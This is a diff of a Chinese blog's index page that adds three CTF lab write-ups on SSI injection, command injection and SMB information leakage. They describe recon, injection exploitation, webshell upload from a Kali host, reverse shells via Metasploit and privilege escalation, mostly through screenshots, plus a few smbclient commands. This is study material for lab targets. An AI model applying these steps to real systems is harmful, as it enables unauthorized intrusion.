@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">62</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">65</span></a>
 
   </li>
   </ul>
@@ -152,6 +152,418 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/11/26/SSI%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SSI注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-26 11:17:51 / 修改时间：11:18:15" itemprop="dateCreated datePublished" datetime="2021-11-26T11:17:51+08:00">2021-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="SSI注入"><a href="#SSI注入" class="headerlink" title="SSI注入"></a>SSI注入</h1><h3 id="SSI注入攻击介绍"><a href="#SSI注入攻击介绍" class="headerlink" title="SSI注入攻击介绍"></a>SSI注入攻击介绍</h3><p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031095501023.png" alt="image-20211031095501023"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031095536153.png" alt="image-20211031095536153"></p>
+<h4 id="步骤1：信息探测"><a href="#步骤1：信息探测" class="headerlink" title="步骤1：信息探测"></a>步骤1：信息探测</h4><p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031095623538.png" alt="image-20211031095623538"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031095654966.png" alt="image-20211031095654966"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031095725275.png" alt="image-20211031095725275"></p>
+<img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031095849824.png" alt="image-20211031095849824" style="zoom:67%;">
+
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031100000296.png" alt="image-20211031100000296"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031100303782.png" alt="image-20211031100303782"></p>
+<p>探测时，发现有：admin（管理员界面）、index（主页）、robots（隐藏目录）、config（配置文件）、login（登录界面）、.php/.python等（可代码审计）、mysql/sql（数据库）、ssi（可能存在ssi漏洞的页面）；以上页面/目录/文件都是可疑的，需要重点关注</p>
+<h5 id="步骤2：深入挖掘"><a href="#步骤2：深入挖掘" class="headerlink" title="步骤2：深入挖掘"></a>步骤2：深入挖掘</h5><p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031100639794.png" alt="image-20211031100639794"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031100647926.png" alt="image-20211031100647926"></p>
+<p>nikto….</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031100908166.png" alt="image-20211031100908166"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031101111950.png" alt="image-20211031101111950"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031101140051.png" alt="image-20211031101140051"></p>
+<p>下载这2个可疑文件，习惯性的查看文件类容（虽然不一定用的上）</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031101737907.png" alt="image-20211031101737907"></p>
+<p>dirk…</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031101030655.png" alt="image-20211031101030655"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031102214294.png" alt="image-20211031102214294"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031101456109.png" alt="image-20211031101456109"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031102015364.png" alt="image-20211031102015364"></p>
+<h5 id="步骤3：漏洞利用"><a href="#步骤3：漏洞利用" class="headerlink" title="步骤3：漏洞利用"></a>步骤3：漏洞利用</h5><p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031102102790.png" alt="image-20211031102102790"></p>
+<p>测试</p>
+<p>要想利用注入漏洞，就需要了解其处理输入的代码格式（上一步已经找到），然后利用该格式构造能够获得有用信息的指令（网站可能会注释/屏蔽某些指令，需要绕过注入；绕过方法有：大小写输入、添加注释符、封闭、编码等等)</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031102239790.png" alt="image-20211031102239790"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031102605670.png" alt="image-20211031102605670"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103011291.png" alt="image-20211031103011291"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103037909.png" alt="image-20211031103037909"></p>
+<p>然后发现获得了一些特别的信息；我们利用第二条指令获取信息/操作；到这里可以确定，需要利用ssi漏洞获得有用信息或进行操作（上传/启动webshell，修改配置）。</p>
+<h5 id="步骤4：制作并上传webshell"><a href="#步骤4：制作并上传webshell" class="headerlink" title="步骤4：制作并上传webshell"></a>步骤4：制作并上传webshell</h5><p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103244263.png" alt="image-20211031103244263"></p>
+<p>上图是php的webshell；这次用python的webshell</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103451812.png" alt="image-20211031103451812"></p>
+<p>设置并启动监听</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103508597.png" alt="image-20211031103508597"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103536363.png" alt="image-20211031103536363"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103639334.png" alt="image-20211031103639334"></p>
+<p>kali开启apache服务</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103929774.png" alt="image-20211031103929774"></p>
+<p>利用注入漏洞上传webshell</p>
+<p>下载kali的webshell</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031103826859.png" alt="image-20211031103826859"></p>
+<p>启动webshell</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031104129043.png" alt="image-20211031104129043"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031104339535.png" alt="image-20211031104339535"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031104316388.png" alt="image-20211031104316388"></p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031104532301.png" alt="image-20211031104532301"></p>
+<p>步骤5:获取 flag</p>
+<p><img src="/2021/11/26/SSI%E6%B3%A8%E5%85%A5/image-20211031104407277.png" alt="image-20211031104407277"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">命令注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-26 11:15:46 / 修改时间：11:16:09" itemprop="dateCreated datePublished" datetime="2021-11-26T11:15:46+08:00">2021-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205003790.png" alt="image-20211101205003790"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205239333.png" alt="image-20211101205239333"></p>
+<h3 id="步骤1：信息探测"><a href="#步骤1：信息探测" class="headerlink" title="步骤1：信息探测"></a>步骤1：信息探测</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205301539.png" alt="image-20211101205301539"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205358227.png" alt="image-20211101205358227"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205642740.png" alt="image-20211101205642740"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205741371.png" alt="image-20211101205741371"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205844043.png" alt="image-20211101205844043"></p>
+<h3 id="步骤2：深入挖掘"><a href="#步骤2：深入挖掘" class="headerlink" title="步骤2：深入挖掘"></a>步骤2：深入挖掘</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205921740.png" alt="image-20211101205921740"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101205928209.png" alt="image-20211101205928209"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101210009347.png" alt="image-20211101210009347"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101210233234.png" alt="image-20211101210233234"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101210158900.png" alt="image-20211101210158900"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101210501170.png" alt="image-20211101210501170"></p>
+<p>继续探测目录，发现了备份文件</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101210638933.png" alt="image-20211101210638933"></p>
+<p>点击下载并放到桌面</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101210733426.png" alt="image-20211101210733426"></p>
+<p>打开/解压back.zip，发现需要密码</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101210803155.png" alt="image-20211101210803155"></p>
+<p>利用之前找到的密码，进行尝试；得到一个mp3格式的文件（备份文件怎么是mp3格式？带着怀疑去查看其真正文件格式）</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101210906050.png" alt="image-20211101210906050"></p>
+<p>发现真实格式是text，查看文档，发现用户名：touhid</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101211345772.png" alt="image-20211101211345772"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101211449940.png" alt="image-20211101211449940"></p>
+<p>查看得到的url，发现是一个登录界面；输入挖掘到的uname并用之前找到的密码进行逐一匹配，最后登录成功</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101211657381.png" alt="image-20211101211657381"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101211730419.png" alt="image-20211101211730419"></p>
+<p>进入服务器后台后，如果是常见的系统（这里是playSM5：网站标题），还可以尝试利用百度等方法看看是否存在某些可以利用的漏洞。</p>
+<h4 id="可利用的信息"><a href="#可利用的信息" class="headerlink" title="可利用的信息"></a>可利用的信息</h4><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101211816652.png" alt="image-20211101211816652"></p>
+<h3 id="步骤3：登录-利用exploit-db"><a href="#步骤3：登录-利用exploit-db" class="headerlink" title="步骤3：登录-利用exploit-db"></a>步骤3：登录-利用exploit-db</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101212109147.png" alt="image-20211101212109147"></p>
+<p>a.利用searchsploit 对应的系统，查看是否存在漏洞</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101212429647.png" alt="image-20211101212429647"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101213016589.png" alt="image-20211101213016589"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101213140807.png" alt="image-20211101213140807"></p>
+<p>b.利用漏洞</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101213430954.png" alt="image-20211101213430954"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101213659411.png" alt="image-20211101213659411"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101213553446.png" alt="image-20211101213553446"></p>
+<p>新建1.csv文件，上传到服务器</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101213749697.png" alt="image-20211101213749697"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101213907214.png" alt="image-20211101213907214"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101213924122.png" alt="image-20211101213924122"></p>
+<p>b-1.利用burpsuite（bp）修改文件名</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101214112383.png" alt="image-20211101214112383"></p>
+<p>设置代理服务器</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101214221701.png" alt="image-20211101214221701"></p>
+<p>再次上传文件，bp就可以抓到包了</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101214336153.png" alt="image-20211101214336153"></p>
+<p>bp抓到包后，将数据包发送到repeater进行修改文件名</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101214551332.png"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101214806865.png" alt="image-20211101214806865"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101214835002.png" alt="image-20211101214835002"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101214937162.png" alt="image-20211101214937162"></p>
+<p>每次利用这个修改名字的漏洞都要进行b-2的操作；因为网站重定向了</p>
+<p>b-2再次利用漏洞</p>
+<p>先打开bp的中断</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101215258926.png" alt="image-20211101215258926"></p>
+<p>上传文件</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101215331883.png" alt="image-20211101215331883"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101215406955.png" alt="image-20211101215406955"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101215431891.png" alt="image-20211101215431891"></p>
+<h3 id="步骤4：制作webshell并监听"><a href="#步骤4：制作webshell并监听" class="headerlink" title="步骤4：制作webshell并监听"></a>步骤4：制作webshell并监听</h3><p>这里靶场地址改为了192.168.1.107，攻击机地址（kali）地址为192.168.1.106.（按你当前的地址来操作即可）</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101215958651.png" alt="image-20211101215958651"></p>
+<p>a.制作webshell</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101220604585.png" alt="image-20211101220604585"></p>
+<p>生成webshell</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101220811284.png" alt="image-20211101220811284"></p>
+<p>启动apache服务</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101220938918.png" alt="image-20211101220938918"></p>
+<p>b.启动监听</p>
+<p>启动msf</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101220032380.png" alt="image-20211101220032380"></p>
+<p>使用渗透模块</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101220115715.png" alt="image-20211101220115715"></p>
+<p>设置playload</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101220307314.png" alt="image-20211101220307314"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101220324200.png" alt="image-20211101220324200"></p>
+<p>启动监听</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101220337898.png" alt="image-20211101220337898"></p>
+<h3 id="步骤5：上传webshell并反弹shell"><a href="#步骤5：上传webshell并反弹shell" class="headerlink" title="步骤5：上传webshell并反弹shell"></a>步骤5：上传webshell并反弹shell</h3><p>a.绕过防火墙上传shell</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101221359723.png" alt="image-20211101221359723"></p>
+<p>绕过方法：编译法</p>
+<p>编码</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101221459154.png" alt="image-20211101221459154"></p>
+<p>b.执行步骤3的b-2操作</p>
+<p>把上面编码的3句译码，加上解码命令作为文件名进行操作；</p>
+<p>第一句（上传shell）</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101221914887.png" alt="image-20211101221914887"></p>
+<p>第二句（修改文件权限）执行b-2同样的操作后，再修改文件名</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101222059408.png" alt="image-20211101222059408"></p>
+<p>第三句（触发并反弹shell）</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101222149941.png" alt="image-20211101222149941"></p>
+<p>获取到shell</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101222252658.png" alt="image-20211101222252658"></p>
+<h3 id="步骤6：提权"><a href="#步骤6：提权" class="headerlink" title="步骤6：提权"></a>步骤6：提权</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101222324377.png" alt="image-20211101222324377"></p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101222507358.png" alt="image-20211101222507358"></p>
+<p>提权</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101222625348.png" alt="image-20211101222625348"></p>
+<h3 id="步骤7：获取flag"><a href="#步骤7：获取flag" class="headerlink" title="步骤7：获取flag"></a>步骤7：获取flag</h3><p>flag往往都是在root目录下的</p>
+<p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101222729074.png" alt="image-20211101222729074"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2021/11/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20211101222748535.png" alt="image-20211101222748535"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="post-title-link" itemprop="url">SMB信息泄露</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-26 11:14:58 / 修改时间：11:15:27" itemprop="dateCreated datePublished" datetime="2021-11-26T11:14:58+08:00">2021-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="SMB信息泄露"><a href="#SMB信息泄露" class="headerlink" title="SMB信息泄露"></a>SMB信息泄露</h1><h3 id="SMB介绍"><a href="#SMB介绍" class="headerlink" title="SMB介绍"></a>SMB介绍</h3><p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030101913702.png" alt="image-20211030101913702"></p>
+<h5 id><a href="#" class="headerlink" title></a><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030101924259.png" alt="image-20211030101924259"></h5><h4 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h4><p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030102016861.png" alt="image-20211030102016861"></p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030102119677.png" alt="image-20211030102119677"></p>
+<h4 id="步骤二：分析探测结果"><a href="#步骤二：分析探测结果" class="headerlink" title="步骤二：分析探测结果"></a>步骤二：分析探测结果</h4><p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030102248592.png" alt="image-20211030102248592"></p>
+<h5 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h5><p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030102341391.png" alt="image-20211030102341391"></p>
+<p>a、smbclient -L IP：扫描出对应IP地址的主机共享的文件夹</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030102710161.png" alt="image-20211030102710161"></p>
+<p>b、smbclient  ‘\\IP\$share’：查看对应IP主机上的共享文件（share指文件名）</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030103200184.png" alt="image-20211030103200184"></p>
+<p>c、get （敏感信息）文件名：下载文件</p>
+<p>这里是在share文件夹里下载，这里找到了一个password 12345</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030103445542.png" alt="image-20211030103445542"></p>
+<p>继续探测，看看还有没有其他的敏感信息</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030103743667.png" alt="image-20211030103743667"></p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030103932330.png" alt="image-20211030103932330"></p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030104035643.png" alt="image-20211030104035643"></p>
+<p>前面我们探测得知：靶机的数据库端口和ssh端口是开放的</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030104132817.png" alt="image-20211030104132817"></p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030104556774.png" alt="image-20211030104556774"></p>
+<p>尝试远程服务登录：远程登录数据库和远程登录SSH服务（这里尝试/登录失败）</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030104703042.png" alt="image-20211030104703042"></p>
+<p>d、searchsploit samba 版本号：查看某个版本号的SMB协议是否有漏洞（溢出）</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030105045103.png" alt="image-20211030105045103"></p>
+<p>版本号</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030105123129.png" alt="image-20211030105123129"></p>
+<p>查看是否有漏洞（这里没探测出漏洞），如果有，可以（用MSF）直接利用漏洞获取靶场权限</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030105228385.png" alt="image-20211030105228385"></p>
+<h5 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h5><p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030105355602.png" alt="image-20211030105355602"></p>
+<p>a、使用（dirb 网址）探测</p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030105553230.png" alt="image-20211030105553230"></p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030105650271.png" alt="image-20211030105650271"></p>
+<p><img src="/2021/11/26/SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20211030105800422.png" alt="image-20211030105800422"></p>
